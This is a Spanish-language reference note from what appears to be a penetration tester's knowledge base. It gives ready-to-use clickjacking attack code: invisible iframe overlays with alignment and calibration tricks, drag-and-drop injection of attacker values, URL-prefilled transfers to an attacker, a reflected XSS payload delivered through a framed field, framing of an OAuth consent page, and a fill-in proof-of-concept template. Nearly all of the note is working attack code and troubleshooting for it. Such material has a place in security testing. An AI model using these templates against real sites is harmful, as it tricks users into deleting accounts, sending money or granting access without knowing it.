---
tipo: meta
aliases:
  - overlay clickjacking
  - PoC clickjacking
  - drag and drop
tags:
  - meta/referencia
  - dominio/web
---

# Clickjacking - superposición - matriz de referencia

> [!info] Referencia pura, no un zettel
> El CSS y el HTML para poner el marco invisible y alinear el señuelo. Comprobar el encuadre es el paso previo, en [[Clickjacking - encuadre - matriz de referencia]]; el criterio, en las dos notas de `600-tradecraft/`.

## 1. La superposición básica

El marco invisible encima, el señuelo debajo, alineados:

```html
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 1000px; height: 800px;
    opacity: 0;              /* invisible */
    z-index: 2;              /* encima del señuelo */
  }
  #senuelo {
    position: absolute;
    top: 300px; left: 260px; /* alineado con el botón del objetivo */
    z-index: 1;
    font-size: 40px;
  }
</style>

<div id="senuelo">Hacé clic acá para ganar</div>
<iframe src="https://objetivo.com/eliminar-cuenta"></iframe>
```

El `opacity: 0` hace el marco invisible; el `z-index` mayor lo pone **encima** del señuelo, así el clic cae en el marco. El señuelo se posiciona bajo el botón real del objetivo.

## 2. Calibrar la alineación

El paso fino. Mientras se calibra, subir la opacidad para ver el objetivo:

```css
iframe { opacity: 0.5; }   /* temporal, para alinear */
```

Ajustar `top`/`left` del marco (o del contenedor) hasta que el botón del objetivo quede exactamente bajo el señuelo. Después bajar a `opacity: 0`.

`pointer-events` también sirve: `pointer-events: none` en el señuelo deja que el clic lo atraviese hasta el marco, sin depender solo del `z-index`.

## 3. Ocultar todo menos el botón

Para que la víctima no vea nada del objetivo aunque el marco tenga algo de opacidad, recortar el marco a solo el botón:

```css
iframe {
  clip-path: inset(300px 0px 0px 260px);  /* mostrar solo la zona del botón */
  transform: scale(3);                     /* agrandar para que sea fácil clickear */
  transform-origin: top left;
}
```

## 4. Relleno por arrastre (drag-and-drop)

Para [[Clickjacking - relleno por arrastre y multipaso]]. Un texto arrastrable que la víctima suelta en un campo del marco:

```html
<div draggable="true" ondragstart="event.dataTransfer.setData('text','valor-del-atacante')">
  Arrastrá esto al recuadro
</div>
<iframe src="https://objetivo.com/formulario"></iframe>
```

El navegador permite soltar texto entre orígenes, así que el campo del marco se rellena con `valor-del-atacante`.

## 5. Precarga por URL

Cuando el objetivo acepta valores por parámetros, cargar el marco con los campos ya llenos:

```html
<iframe src="https://objetivo.com/transferir?destino=atacante&monto=1000"></iframe>
```

La víctima solo clickea "enviar". El relleno lo hizo la URL. Es la vía más fiable del multipaso.

## 6. Entregar un XSS

Precargar un campo reflejado con un payload, y el clic lo dispara:

```html
<iframe src="https://objetivo.com/buscar?q=<img src=x onerror=alert(1)>"></iframe>
```

Clickjacking como vector de entrega de [[XSS - reflejado]] cuando el XSS necesita interacción.

## 7. Encuadrar el consentimiento de OAuth

```html
<iframe src="https://objetivo.com/oauth/authorize?client_id=ATACANTE&..."></iframe>
```

Con el botón "Autorizar" bajo el señuelo, la víctima concede acceso a la aplicación del atacante sin saberlo. Cruza con [[MOC - OAuth]].

## 8. Plantilla de prueba de concepto

```html
<!doctype html>
<html><head><style>
  body { margin:0; }
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.0; z-index:2; }
  .decoy { position:absolute; z-index:1; }
  #b { top:CALIBRAR px; left:CALIBRAR px; }
</style></head>
<body>
  <div class="decoy" id="b" style="font-size:50px">CLIC ACÁ</div>
  <iframe src="https://objetivo.com/ACCION"></iframe>
</body></html>
```

Reemplazar `ACCION` y calibrar `top`/`left`. O usar Burp Clickbandit — ver [[Clickjacking - encuadre - matriz de referencia]] § 5.

## 9. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El clic no ejecuta la acción | El `z-index` del marco no está encima; o mala alineación |
| El señuelo bloquea el clic | Agregar `pointer-events: none` al señuelo |
| El botón queda fuera del marco visible | Ajustar `top`/`left` del contenedor, o usar `clip-path` |
| El arrastre no rellena | El navegador cambió las reglas de drag entre orígenes; probar precarga |
| La precarga no llena el campo | El objetivo no acepta ese parámetro; mapear los nombres |
| Se ve el objetivo detrás | Bajar `opacity` a 0 tras calibrar, o recortar con `clip-path` |

## Relacionadas

[[MOC - Clickjacking]] · [[Clickjacking - encuadre - matriz de referencia]] · [[XSS contextos - matriz de referencia]] · [[OAuth - matriz de reconocimiento]]
